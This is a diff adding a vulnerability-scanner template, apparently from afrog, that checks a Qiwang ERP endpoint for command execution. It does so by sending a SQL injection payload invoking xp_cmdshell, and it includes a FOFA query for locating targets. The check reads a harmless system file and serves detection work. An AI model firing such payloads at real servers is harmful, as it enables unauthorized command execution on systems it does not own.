@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: comboxsql=exec%20xp_cmdshell%20'type%20C:\Windows\Win.ini'
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - for 16-bit app support
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/mainFunctions/comboxstore.action'
+id: qiwang-erp-comboxstore-rce
+info:
+  author: peiqi
+  description: |-
+    企望制造 ERP comboxstore.action接口存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令
+    fofa: title="企望制造ERP系统"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 企望制造 ERP comboxstore.action 远程命令执行漏洞
+  severity: high
+  tags: dahua,sqli,argus-import
